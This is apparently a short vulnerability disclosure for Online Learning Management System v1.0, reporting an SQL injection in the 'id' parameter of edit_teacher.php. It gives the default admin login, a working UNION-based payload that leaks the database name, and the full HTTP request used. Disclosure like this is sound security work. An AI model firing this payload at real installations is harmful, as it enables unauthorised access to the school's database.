# Online Learning Management System v1.0 by sourcecodester has SQL injection 4

BUG_Author: Du Kai

Login account: admin/admin

vendors: https://www.sourcecodester.com/php/7339/learning-management-system.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /lms/admin/edit_teacher.php

Vulnerability location: /lms/admin/edit_teacher.php?id=, id

dbname=capstone

[+] Payload: /lms/admin/edit_teacher.php?id=-9%27%20union%20select%201,2,3,database(),5,6,7,8,9,10--+ // Leak place ---> id

```sql
GET /lms/admin/edit_teacher.php?id=-9%27%20union%20select%201,2,3,database(),5,6,7,8,9,10--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=uu9o3gvufrsptq8n5f6gjpbuac
Connection: close


```

<img width="1661" height="773" alt="image" src="https://github.com/user-attachments/assets/16291726-8d0b-4374-8e85-3b845cc5570a" />
